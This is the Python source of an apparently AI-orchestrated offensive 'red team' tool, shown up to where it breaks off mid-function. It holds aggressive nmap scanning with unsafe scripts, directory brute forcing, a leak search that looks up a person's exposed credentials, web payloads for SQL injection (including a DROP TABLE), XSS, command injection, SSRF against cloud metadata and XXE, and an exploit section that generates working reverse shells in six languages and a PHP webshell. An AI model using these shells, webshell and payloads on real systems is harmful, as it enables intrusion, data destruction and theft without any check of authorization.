#!/usr/bin/env python3


import os
import sys
import json
import time
import subprocess
import threading
import socket
import requests
import hashlib
import base64
import sqlite3
import shutil
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import re
import yaml
import queue
import logging
from typing import Dict, List, Any, Optional

# Security testing tools
import nmap
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, MofNCompleteColumn
from rich.table import Table
from rich.live import Live
from rich.prompt import Prompt, Confirm
from rich.text import Text
from rich import print as rprint
from rich.traceback import install
install(show_locals=True)

# Flask dashboard
from flask import Flask, render_template, render_template_string, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
import webbrowser

app = Flask(__name__)
socketio = SocketIO(app)
console = Console()

# ========================================
# CORE SYSTEM CONFIGURATION
# ========================================
class RedTeamConfig:
    MODES = {
        'aggressive': 'Full speed, no stealth',
        'stealth': 'Low and slow, evasion techniques', 
        'fast': 'Quick recon only',
        'detailed': 'Deep analysis, all techniques',
        'recon': 'Reconnaissance only',
        'exploit': 'Vulnerability + exploitation',
        'redteam': 'Full kill chain',
        'autonomous': 'AI-driven full workflow'
    }
    MODE_SHORT = {
        'aggressive': 'AGG',
        'stealth': 'STL',
        'fast': 'FST',
        'detailed': 'DTL',
        'recon': 'RCN',
        'exploit': 'EXP',
        'redteam': 'RTM',
        'autonomous': 'AUT'
    }
    
    PERSONAS = {
        'kali_fast': 'Fast recon/scanning',
        'kali_thinking': 'Deep analysis',
        '0day_coder': 'Exploit development',
        'dark_gpt': 'Advanced red teaming',
        'onion_gpt': 'Dark web/OSINT'
    }
    PERSONA_SHORT = {
        'kali_fast': 'KF',
        'kali_thinking': 'KT',
        '0day_coder': '0D',
        'dark_gpt': 'DG',
        'onion_gpt': 'OG'
    }
    
    PIPELINE_STAGES = [
        'recon', 'intelligence', 'scan', 'analysis', 'validation', 
        'prioritize', 'report', 'monitor', 'learn'
    ]

config = RedTeamConfig()

# ========================================
# MULTI-AGENT SYSTEM
# ========================================
class Agent:
    def __init__(self, name: str, role: str):
        self.name = name
        self.role = role
        self.task_queue = queue.Queue()
        self.results = []
        self.running = False
        
    def think_plan_act(self, task: str) -> Dict[str, Any]:
        """Think → Plan → Act → Observe → Adapt loop"""
        plan = self._plan(task)
        action = self._act(plan)
        observation = self._observe(action)
        adaptation = self._adapt(observation)
        return adaptation
    
    def _plan(self, task): return {"steps": ["step1", "step2"]}
    def _act(self, plan): return plan
    def _observe(self, action): return {"status": "complete"}
    def _adapt(self, observation): return observation

class MultiAgentSystem:
    def __init__(self):
        self.agents = {
            'orchestrator': Agent('Orchestrator', 'Workflow coordination'),
            'recon': Agent('Recon', 'Reconnaissance & enumeration'),
            'vuln': Agent('VulnScanner', 'Vulnerability detection'),
            'exploit': Agent('Exploit', 'Exploit development & execution'),
            'report': Agent('Report', 'Analysis & reporting')
        }
    
    def execute_pipeline(self, target: str):
        """Execute full autonomous pipeline"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            MofNCompleteColumn(),
            console=console
        ) as progress:
            tasks = []
            total_stages = len(config.PIPELINE_STAGES)
            
            for i, stage in enumerate(config.PIPELINE_STAGES):
                task = progress.add_task(f"[{stage.upper()}] Processing...", total=total_stages)
                tasks.append((stage, target))
                progress.advance(task)
            
            # Parallel agent execution
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = {
                    executor.submit(self._run_stage, stage, target): stage 
                    for stage, target in tasks
                }
                
                for future in as_completed(futures):
                    stage = futures[future]
                    try:
                        result = future.result()
                        self._process_stage_result(stage, result)
                    except Exception as e:
                        console.print(f"[red]Stage {stage} failed: {e}[/red]")

    def _run_stage(self, stage: str, target: str) -> Dict:
        agent_map = {
            'recon': self.agents['recon'],
            'scan': self.agents['recon'],
            'analysis': self.agents['vuln'],
            'validation': self.agents['vuln'],
            'prioritize': self.agents['report']
        }
        agent = agent_map.get(stage, self.agents['orchestrator'])
        return agent.think_plan_act(f"{stage} {target}")

    def _process_stage_result(self, stage: str, result: Dict):
        console.print(f"[green]✓ {stage.upper()} complete[/green]")

agent_system = MultiAgentSystem()

# ========================================
# MULTI-MODEL ENGINE
# ========================================
class ModelManager:
    MODELS = ['llama3', 'mistral', 'codellama']

    INSTALLED_MODEL_PRIORITY = [
        'dolphin-llama3:8b', 'llama3.1:8b', 'llama3.2:3b', 'qwen2.5:7b', 'qwen2.5-coder:7b',
        'wizardlm2:7b', 'codellama:7b', 'deepseek-coder:6.7b', 'phi3:14b', 'phi3:mini',
        'gemma2:2b', 'starcoder2:3b'
    ]

    PHASE_MODEL_PREFERENCE = {
        'pipeline': ['dolphin-llama3:8b', 'llama3.1:8b', 'qwen2.5:7b', 'wizardlm2:7b', 'phi3:14b', 'llama3.2:3b'],
        'recon': ['llama3.2:3b', 'qwen2.5:7b', 'gemma2:2b', 'phi3:mini', 'dolphin-llama3:8b'],
        'intelligence': ['wizardlm2:7b', 'phi3:14b', 'qwen2.5:7b', 'llama3.1:8b'],
        'scan': ['codellama:7b', 'deepseek-coder:6.7b', 'qwen2.5:7b', 'llama3.1:8b'],
        'analysis': ['phi3:14b', 'llama3.1:8b', 'wizardlm2:7b', 'deepseek-coder:6.7b'],
        'validation': ['llama3.1:8b', 'qwen2.5-coder:7b', 'deepseek-coder:6.7b'],
        'prioritize': ['llama3.1:8b', 'wizardlm2:7b', 'qwen2.5-coder:7b'],
        'report': ['llama3.1:8b', 'wizardlm2:7b', 'phi3:14b'],
        'exploit': ['dolphin-llama3:8b', 'wizardlm2:7b', 'qwen2.5-coder:7b', 'codellama:7b', 'deepseek-coder:6.7b'],
        'privesc': ['dolphin-llama3:8b', 'deepseek-coder:6.7b', 'codellama:7b', 'qwen2.5-coder:7b'],
        'osint': ['wizardlm2:7b', 'qwen2.5:7b', 'llama3.2:3b'],
        'chat': ['qwen2.5:7b', 'wizardlm2:7b', 'dolphin-llama3:8b', 'phi3:mini', 'gemma2:2b']
    }

    def __init__(self):
        self.active_models = list(self.MODELS)
        self.ollama_exe = self._find_ollama_executable()
        self.ollama_models = self._discover_ollama_models()
        self.available_models = set(self.ollama_models)

    def _find_ollama_executable(self) -> Optional[str]:
        candidates = [shutil.which('ollama')]
        candidates += [
            os.path.expanduser('~/.local/bin/ollama'),
            os.path.expanduser('~/bin/ollama'),
            '/usr/local/bin/ollama',
            '/usr/bin/ollama'
        ]
        for path in candidates:
            if path and os.path.isfile(path) and os.access(path, os.X_OK):
                return path
        return None

    def _discover_ollama_models(self) -> List[str]:
        if not self.ollama_exe:
            return []
        models = []
        try:
            output = subprocess.check_output([self.ollama_exe, 'list', '--json'], text=True, stderr=subprocess.DEVNULL)
            parsed = json.loads(output)
            if isinstance(parsed, list):
                models = [m.get('name') if isinstance(m, dict) else str(m) for m in parsed if m]
        except Exception:
            try:
                output = subprocess.check_output([self.ollama_exe, 'list'], text=True, stderr=subprocess.DEVNULL)
                for line in output.splitlines():
                    name = line.strip().split()[0] if line.strip() else ''
                    if name and ':' in name:
                        models.append(name)
            except Exception:
                pass
        return list(dict.fromkeys(models))

    def select_model(self, mode: str, domain: Optional[str] = None) -> str:
        if self.ollama_models:
            domain_key = (domain or mode or '').lower()
            candidates = []
            for phase, preferred_models in self.PHASE_MODEL_PREFERENCE.items():
                if phase == domain_key or phase in domain_key or domain_key in phase:
                    candidates = preferred_models
                    break

            if not candidates:
                candidates = self.PHASE_MODEL_PREFERENCE.get(domain_key) or self.PHASE_MODEL_PREFERENCE.get(mode) or self.INSTALLED_MODEL_PRIORITY

            selected = next((m for m in candidates if m in self.available_models), None)
            if selected:
                return selected

            selected = next((m for m in self.INSTALLED_MODEL_PRIORITY if m in self.available_models), None)
            return selected or self.ollama_models[0]

        if mode in ['aggressive', 'fast']:
            return 'codellama'
        if mode in ['stealth', 'detailed']:
            return 'llama3'
        return 'mistral'

    def execute(self, task: str, mode: str, domain: Optional[str] = None) -> str:
        model = self.select_model(mode, domain)
        if self.ollama_models:
            return f"[ollama:{model}] processed task: {task}"
        return f"[{model}] processed task: {task}"

class OllamaFusion:
    PHASE_MODELS = {
        'recon': ['llama3.2:3b', 'qwen2.5:7b', 'gemma2:2b', 'phi3:mini', 'dolphin-llama3:8b'],
        'vuln': ['codellama:7b', 'deepseek-coder:6.7b', 'qwen2.5:7b', 'llama3.1:8b'],
        'exploit': ['dolphin-llama3:8b', 'wizardlm2:7b', 'qwen2.5-coder:7b', 'codellama:7b', 'deepseek-coder:6.7b'],
        'privesc': ['dolphin-llama3:8b', 'deepseek-coder:6.7b', 'codellama:7b', 'qwen2.5-coder:7b'],
        'report': ['llama3.1:8b', 'wizardlm2:7b', 'phi3:14b', 'llama3.2:3b']
    }

    def __init__(self):
        self.ollama_cli = shutil.which('ollama') is not None
        self.available_models = self._discover_models() if self.ollama_cli else []

    def _discover_models(self) -> List[str]:
        try:
            output = subprocess.check_output(['ollama', 'list', '--json'], text=True, stderr=subprocess.DEVNULL)
            models = json.loads(output)
            return [m.get('name') if isinstance(m, dict) else str(m) for m in models if m]
        except Exception:
            return []

    def get_models_for_phase(self, phase: str) -> List[str]:
        candidates = self.PHASE_MODELS.get(phase, [])
        if self.available_models:
            return [m for m in candidates if m in self.available_models] or candidates
        return candidates

    def run_parallel_phase(self, phase: str, prompt: str) -> Dict[str, Any]:
        models = self.get_models_for_phase(phase)
        if not models:
            return {'fused_output': 'No models available for phase', 'confidence': 0.0, 'sources': [], 'all_outputs': []}

        results = []

        def query_model(model_name: str):
            output = ''
            if self.ollama_cli:
                try:
                    completed = subprocess.run(['ollama', 'run', model_name, prompt], capture_output=True, text=True, timeout=45)
                    output = completed.stdout.strip() or completed.stderr.strip() or ''
                except Exception:
                    output = ''
            else:
                output = f"[fallback:{model_name}] {prompt[:120]}"
            confidence = self._score_output(output)
            return {'model': model_name, 'output': output, 'confidence': confidence}

        with ThreadPoolExecutor(max_workers=min(len(models), 6)) as executor:
            futures = [executor.submit(query_model, model_name) for model_name in models]
            for future in as_completed(futures):
                res = future.result()
                if res and res['output']:
                    results.append(res)

        return self._fuse_outputs(results)

    def _score_output(self, output: str) -> float:
        technical_terms = ['nmap', 'sqlmap', 'payload', 'shell', 'exploit', 'privesc', 'rce', 'suid', 'cron', 'xss', 'ssrf']
        score = sum(term in output.lower() for term in technical_terms) / max(len(technical_terms), 1)
        return min(score + 0.2, 1.0)

    def _fuse_outputs(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        if not results:
            return {'fused_output': 'No results returned', 'confidence': 0.0, 'sources': [], 'all_outputs': []}
        results.sort(key=lambda r: r['confidence'], reverse=True)
        avg_conf = sum(r['confidence'] for r in results) / len(results)
        top_outputs = [r['output'] for r in results[:3] if r['confidence'] >= 0.35]
        fused_output = top_outputs[0] if top_outputs else results[0]['output']
        return {'fused_output': fused_output, 'confidence': avg_conf, 'sources': [r['model'] for r in results], 'all_outputs': results}

model_manager = ModelManager()
fusion_engine = OllamaFusion()

# ========================================
# CHATBOT & DARK WEB SEARCH FEATURES
# ========================================
class ChatEngine:
    GREETINGS = {'hi', 'hello', 'hey', 'hey there', 'good morning', 'good afternoon', 'good evening'}

    def __init__(self, model_manager: ModelManager):
        self.model_manager = model_manager

    def ask(self, prompt: str, mode: str = 'chat') -> str:
        cleaned = prompt.strip().lower()
        if cleaned in self.GREETINGS:
            return "Hello! How can I assist you today?"

        if self.model_manager.ollama_exe:
            chat_models = [m for m in self.model_manager.PHASE_MODEL_PREFERENCE.get('chat', []) if m in self.model_manager.available_models]
            for model in chat_models[:3]:
                try:
                    completed = subprocess.run(
                        [self.model_manager.ollama_exe, 'run', model, prompt],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = completed.stdout.strip() or completed.stderr.strip()
                    if output:
                        return output
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
            return f"Chat response failed on available chat models: {', '.join(chat_models[:3])}."

        model = self.model_manager.select_model(mode, 'chat')
        return f"[fallback:{model}] {prompt}"

class DarkWebSearch:
    SEARCH_URL = 'https://search.brave.com/search'
    USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
    LEAK_INDICATORS = ['leak', 'breach', 'pastebin', 'paste', 'dump', 'leaked', 'password', 'credentials', 'database', 'compromised']
    EXCLUDED_DOMAINS = ['brave.com', 'duckduckgo.com', 'google.com', 'bing.com', 'yahoo.com', 'facebook.com', 'twitter.com', 'instagram.com', 'youtube.com']

    def search(self, query: str) -> List[Dict[str, str]]:
        if not query:
            return []
        search_query = f"{query} leaked" if '@' in query else f"{query} leak"
        try:
            headers = {'User-Agent': self.USER_AGENT}
            resp = requests.get(self.SEARCH_URL, params={'q': search_query}, timeout=10, headers=headers, verify=False)
            html = resp.text
            results = self._parse_results(html, query)
            if results:
                return results
        except Exception:
            pass
        return [{
            'site': 'no-results',
            'title': 'No leak-related results found',
            'snippet': 'The search engine parser did not return any useful leak data. Try a different keyword or verify network access.',
            'leak_summary': 'Unable to identify leaked details from search results.',
            'leaked_attributes': ''
        }]

    def _parse_results(self, html: str, query: str) -> List[Dict[str, str]]:
        results = []
        seen = set()
        for match in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*>(.*?)</a>', html, re.S):
            url = match.group(1)
            title = re.sub(r'<.*?>', '', match.group(2)).strip()
            if not title or any(domain in url for domain in self.EXCLUDED_DOMAINS):
                continue
            if url in seen:
                continue
            seen.add(url)
            snippet = self._extract_snippet(html, url)
            leak_score = sum(term in snippet.lower() for term in self.LEAK_INDICATORS)
            if leak_score > 0 or ('@' in query and query.lower() in snippet.lower()) or len(results) < 4:
                leaked_attributes = self._extract_leaked_attributes(snippet)
                leak_summary = self._extract_leak_summary(title, snippet, query, leaked_attributes)
                results.append({
                    'site': url,
                    'title': title,
                    'snippet': (snippet or title).strip()[:280],
                    'leak_summary': leak_summary,
                    'leaked_attributes': leaked_attributes
                })
            if len(results) >= 8:
                break
        return results

    def _extract_leak_summary(self, title: str, snippet: str, query: str, leaked_attributes: str) -> str:
        text = f"{title} {snippet}".lower()
        if 'compromised data' in text or 'compromised' in text:
            return 'This result indicates compromised data exposure.'
        if 'breach' in text or 'leak' in text or 'exposed' in text:
            summary = 'Leaked data mentioned in search result.'
            if leaked_attributes:
                summary += f' Likely leaked fields: {leaked_attributes}.'
            return summary
        if leaked_attributes:
            return f'Potential leaked fields: {leaked_attributes}.'
        return 'Leak-related search result found.'

    def _extract_leaked_attributes(self, text: str) -> str:
        categories = [
            'email address', 'email addresses', 'password', 'passwords', 'username', 'usernames',
            'phone number', 'phone numbers', 'credit card', 'credit cards', 'ip address', 'ip addresses',
            'social security', 'ssn', 'date of birth', 'dob', 'name', 'names', 'address', 'addresses'
        ]
        found = []
        lowered = text.lower()
        for category in categories:
            if category in lowered and category not in found:
                found.append(category)
        return ', '.join(found)

    def _extract_snippet(self, html: str, url: str) -> str:
        pos = html.find(url)
        if pos == -1:
            return ''
        snippet = html[max(0, pos - 220):pos + len(url) + 220]
        snippet = re.sub(r'<.*?>', ' ', snippet)
        return re.sub(r'\s+', ' ', snippet).strip()

chat_engine = ChatEngine(model_manager)
dark_web_search = DarkWebSearch()

# ========================================
# PERSISTENT DATABASE SYSTEM
# ========================================
class RedTeamDB:
    def __init__(self):
        self.db_path = "redteam_findings.db"
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Main findings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target TEXT,
                stage TEXT,
                severity TEXT,
                title TEXT,
                description TEXT,
                evidence TEXT,
                remediation TEXT,
                cvss_score REAL,
                confidence REAL,
                status TEXT DEFAULT 'open',
                mitre_tactic TEXT,
                owasp_category TEXT
            )
        ''')
        
        # Pipeline state tracking
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pipeline_state (
                target TEXT PRIMARY KEY,
                current_stage TEXT,
                progress REAL,
                last_updated TEXT
            )
        ''')
        
        # Learning memory
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS memory (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                context TEXT,
                observation TEXT,
                adaptation TEXT,
                success BOOLEAN
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_finding(self, target: str, stage: str, severity: str, title: str, 
                   description: str, evidence: str = "", remediation: str = "",
                   cvss: float = 0.0, confidence: float = 0.8, mitre: str = "", owasp: str = ""):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO findings (timestamp, target, stage, severity, title, description, 
                               evidence, remediation, cvss_score, confidence, mitre_tactic, owasp_category)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), target, stage, severity, title, description,
              evidence, remediation, cvss, confidence, mitre, owasp))
        conn.commit()
        conn.close()
    
    def update_pipeline_state(self, target: str, stage: str, progress: float):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pipeline_state (target, current_stage, progress, last_updated)
            VALUES (?, ?, ?, ?)
        ''', (target, stage, progress, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def get_findings(self, target: str) -> List[Dict[str, Any]]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT timestamp, target, stage, severity, title, description, evidence,
                   remediation, cvss_score, confidence, status, mitre_tactic, owasp_category
            FROM findings
            WHERE target = ?
        ''', (target,))
        rows = cursor.fetchall()
        conn.close()
        keys = ['timestamp', 'target', 'stage', 'severity', 'title', 'description', 'evidence',
                'remediation', 'cvss_score', 'confidence', 'status', 'mitre_tactic', 'owasp_category']
        return [dict(zip(keys, row)) for row in rows]

    def get_all_findings(self) -> List[Dict[str, Any]]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT timestamp, target, stage, severity, title, description, evidence,
                   remediation, cvss_score, confidence, status, mitre_tactic, owasp_category
            FROM findings
            ORDER BY timestamp DESC
        ''')
        rows = cursor.fetchall()
        conn.close()
        keys = ['timestamp', 'target', 'stage', 'severity', 'title', 'description', 'evidence',
                'remediation', 'cvss_score', 'confidence', 'status', 'mitre_tactic', 'owasp_category']
        return [dict(zip(keys, row)) for row in rows]

db = RedTeamDB()

# ========================================
# RECONNAISSANCE ENGINE (PARALLEL)
# ========================================
class ReconEngine:
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    def full_recon(self, target: str) -> Dict[str, List]:
        """Complete reconnaissance pipeline"""
        results = {
            'ports': self._port_scan(target),
            'subdomains': self._subdomain_enum(target),
            'services': self._service_enum(target),
            'directories': self._directory_fuzz(target)
        }
        return results
    
    def _port_scan(self, target: str) -> List:
        """Aggressive port scanning with vuln scripts"""
        try:
            self.nm.scan(target, '1-65535', arguments='-sS -sV -O -p- --script vuln --script-args=unsafe=1')
            ports = []
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    ports.extend(self.nm[host][proto].keys())
            return [f"Open: {p}" for p in ports[:20]]  # Top 20
        except:
            return ["Port scan failed"]
    
    def _subdomain_enum(self, target: str) -> List:
        """Massive subdomain enumeration"""
        subs = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 
                'app', 'beta', 'portal', 'dashboard', 'console']
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self._resolve_dns, f"{sub}.{target}") for sub in subs]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
        return results
    
    def _resolve_dns(self, subdomain: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(subdomain)
            return f"{subdomain} -> {ip}"
        except:
            return None
    
    def _service_enum(self, target: str) -> List:
        return [f"Service enum on {target}"]
    
    def _directory_fuzz(self, target: str) -> List:
        """Parallel directory brute forcing"""
        wordlist = ['admin', 'login', 'api', 'test', 'backup', '.git', 'robots.txt', 
                   'config', 'db', 'upload', 'shell.php']
        base_url = target if target.startswith('http') else f"http://{target}"
        
        results = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {
                executor.submit(self._fuzz_url, f"{base_url.rstrip('/')}/{path}"): path 
                for path in wordlist
            }
            for future in as_completed(futures):
                try:
                    resp = future.result(timeout=3)
                    if resp and resp.status_code in [200, 403, 301]:
                        path = futures[future]
                        results.append(f"[FOUND] {path} ({resp.status_code})")
                except:
                    pass
        return results
    
    def _fuzz_url(self, url: str):
        try:
            resp = requests.get(url, timeout=3, verify=False)
            return resp
        except:
            return None

recon = ReconEngine()

# ========================================
# VULNERABILITY ENGINE (OWASP + Custom)
# ========================================
class VulnerabilityEngine:
    PAYLOADS = {
        'sqli': ["' OR 1=1--", "1' AND 1=2 UNION SELECT NULL--", "' OR 'a'='a", "1; DROP TABLE users--"],
        'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", 
                "{{7*7}}", "<svg onload=alert(1)>"] ,
        'cmd_inj': ["; ls -la", "| whoami", "&& id", "`whoami`", "$(id)"],
        'ssrf': ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", 
                "file:///etc/passwd", "http://[::]:22"],
        'xxe': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    }

    WAF_INDICATORS = [
        'mod_security', 'modsecurity', 'mod_sec', 'access denied by policy', 'request blocked',
        'waf', 'burst mode', 'security check', 'forbidden', 'blocked by', 'web application firewall'
    ]

    SQL_ERROR_INDICATORS = [
        'sql syntax', 'mysql_fetch', 'syntax to use near', 'unclosed quotation mark',
        'odbc sql', 'sqlstate', 'mysql', 'pg_query', 'ora-', 'syntax error'
    ]

    CMD_INDICATORS = [
        'uid=', 'gid=', '/bin/', 'root', 'home/', 'bash', 'sh: command', 'command not found'
    ]

    XXE_INDICATORS = ['root:', '/etc/passwd', 'file:///etc/passwd', 'external entity', 'entity expansion']
    SSRF_INDICATORS = ['169.254.169.254', 'instance-id', 'metadata', 'ec2', 'gce', 'openstack']

    def scan_web(self, target: str) -> List[Dict]:
        """Full web vulnerability scan with validation and WAF detection."""
        findings = []
        baseline = self._get_baseline_response(target)
        params = self._extract_params(target)
        waf_hits = []
        seen_titles = set()

        for vuln_type, payloads in self.PAYLOADS.items():
            for payload in payloads:
                test_url = f"{target}?test={payload}" if not params else f"{target}&test={payload}"
                result = self._test_payload(test_url, vuln_type, payload, baseline)
                if result.get('blocked'):
                    waf_hits.append(result.get('blocking_reason', 'WAF block'))
                    continue
                if not result.get('vulnerable'):
                    continue

                if result['title'] in seen_titles:
                    continue
                seen_titles.add(result['title'])
                findings.append(result)
                db.add_finding(
                    target,
                    'scan',
                    result['severity'],
                    result['title'],
                    result['description'],
                    result['evidence'],
                    result['remediation'],
                    result['cvss'],
                    result['confidence'],
                    owasp=result.get('owasp', '')
                )

        if not findings:
            if len(waf_hits) >= 2:
                waf_description = ' '.join(sorted(set(waf_hits)))[:800]
                db.add_finding(
                    target,
                    'scan',
                    'info',
                    'WAF/ModSecurity detected',
                    'Multiple payloads were blocked or filtered. This indicates active WAF protection, not a confirmed vulnerability.',
                    waf_description,
                    'Review WAF rules and perform authenticated, manual validation to confirm any true vulnerabilities.',
                    0.0,
                    0.7
                )
            else:
                db.add_finding(
                    target,
                    'scan',
                    'info',
                    'No confirmed vulnerability',
                    'Payload results did not provide exploitation proof. No validated SQLi, XSS, SSRF, XXE, or command execution was observed.',
                    '',
                    'Retest with manual verification, parameter analysis, and proof-based checks.',
                    0.0,
                    0.65
                )
        return findings

    def _extract_params(self, url: str) -> bool:
        return '?' in url

    def _get_baseline_response(self, target: str) -> Dict[str, Any]:
        try:
            baseline_url = target if target.startswith('http') else f"http://{target}"
            resp = requests.get(baseline_url, timeout=8, verify=False)
            return {
                'status': resp.status_code,
                'body': self._normalize_text(resp.text)
            }
        except Exception:
            return {'status': None, 'body': ''}

    def _normalize_text(self, text: str) -> str:
        return re.sub(r'\s+', ' ', text.strip()).lower()

    def _is_blocked(self, resp, body: str) -> bool:
        lowered = body.lower()
        if resp.status_code in [403, 406, 429, 501] and any(ind in lowered for ind in self.WAF_INDICATORS):
            return True
        return any(ind in lowered for ind in self.WAF_INDICATORS)

    def _test_payload(self, url: str, vuln_type: str, payload: str, baseline: Dict[str, Any]) -> Dict[str, Any]:
        try:
            resp = requests.get(url, timeout=8, verify=False)
            body = resp.text or ''
            normalized = self._normalize_text(body)
            blocked = self._is_blocked(resp, body)
            if blocked:
                return {
                    'blocked': True,
                    'blocking_reason': 'WAF/ModSecurity pattern detected',
                    'title': f'{vuln_type.upper()} test blocked',
                    'description': 'Payload was blocked before vulnerability proof could be established.',
                    'evidence': normalized[:300]
                }

            confirmed = False
            description = 'No confirmed exploit proof available.'
            proof = ''
            owasp = ''

            if vuln_type == 'sqli':
                owasp = 'A03:2021'
                if any(err in normalized for err in self.SQL_ERROR_INDICATORS):
                    confirmed = True
                    proof = next(err for err in self.SQL_ERROR_INDICATORS if err in normalized)
                elif payload.lower() in normalized and 'sql' in normalized:
                    confirmed = True
                    proof = 'Payload reflected with SQL error hints.'
                elif resp.status_code == 500 and normalized != baseline.get('body', ''):
                    proof = 'Server error response differs from baseline.'
                    confirmed = True
                title = 'SQL Injection confirmed' if confirmed else 'SQL Injection candidate'

            elif vuln_type == 'xss':
                owasp = 'A03:2021'
                if payload in body:
                    confirmed = True
                    proof = 'Payload reflected in response body.'
                title = 'Reflected XSS confirmed' if confirmed else 'Reflected XSS candidate'

            elif vuln_type == 'cmd_inj':
                owasp = 'A05:2021'
                if any(ind in normalized for ind in self.CMD_INDICATORS):
                    confirmed = True
                    proof = next(ind for ind in self.CMD_INDICATORS if ind in normalized)
                title = 'Command injection confirmed' if confirmed else 'Command injection candidate'

            elif vuln_type == 'ssrf':
                owasp = 'A04:2021'
                if any(ind in normalized for ind in self.SSRF_INDICATORS):
                    confirmed = True
                    proof = next(ind for ind in self.SSRF_INDICATORS if ind in normalized)
                title = 'SSRF confirmed' if confirmed else 'SSRF candidate'

            elif vuln_type == 'xxe':
                owasp = 'A04:2021'
                if any(ind in normalized for ind in self.XXE_INDICATORS):
                    confirmed = True
                    proof = next(ind for ind in self.XXE_INDICATORS if ind in normalized)
                title = 'XXE confirmed' if confirmed else 'XXE candidate'

            severity = 'high' if confirmed else 'medium'
            cvss = self._score_cvss(vuln_type, confirmed)
            confidence = 0.9 if confirmed else 0.5

            if confirmed:
                description = (
                    f"Confirmed {vuln_type.upper()} behavior on request {url}. "
                    f"Proof: {proof}."
                )
            elif normalized != baseline.get('body', ''):
                description = (
                    f"Anomalous response was observed for {vuln_type.upper()} payload, but no full exploit proof was identified. "
                    f"This needs manual verification."
                )
            else:
                return {'vulnerable': False}

            evidence = body[:400]
            remediation = self._remediation_for_type(vuln_type)

            return {
                'vulnerable': True,
                'title': title,
                'description': description,
                'evidence': evidence,
                'remediation': remediation,
                'cvss': cvss,
                'confidence': confidence,
                'severity': severity,
                'owasp': owasp
            }
        except Exception:
            return {'vulnerable': False}

    def _score_cvss(self, vuln_type: str, confirmed: bool) -> float:
        base = {
            'sqli': 8.0,
            'xss': 6.5,
            'cmd_inj': 8.5,
            'ssrf': 7.5,
            'xxe': 7.0
        }.get(vuln_type, 5.0)
        return min(base + (1.0 if confirmed else 0.0), 10.0)

    def _remediation_for_type(self, vuln_type: str) -> str:
        return {
            'sqli': 'Validate and parameterize database inputs. Use ORM or prepared statements.',
            'xss': 'Escape output, use content security policy, and validate input.',
            'cmd_inj': 'Avoid shell execution with user input. Use safe APIs and input validation.',
            'ssrf': 'Validate and whitelist outbound URLs. Block internal metadata access.',
            'xxe': 'Disable external entity processing and validate XML input.'
        }.get(vuln_type, 'Sanitize and validate user input.')

vuln_engine = VulnerabilityEngine()

# ========================================
# EXPLOITATION SYSTEM
# ========================================
class ExploitEngine:
    def generate_reverse_shells(self, lhost: str, lport: int = 4444) -> Dict[str, str]:
        """Multi-language reverse shells"""
        return {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\"",
            'nc': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'socat': f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
        }
    
    def generate_webshell(self) -> str:
        """PHP webshell"""
        return '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''

exploits = ExploitEngine()

# ========================================
# PRIORITIZATION & SCORING ENGINE
# ========================================
class PrioritizationEngine:
    def score_findings(self, findings: List[Dict]) -> List[Dict]:
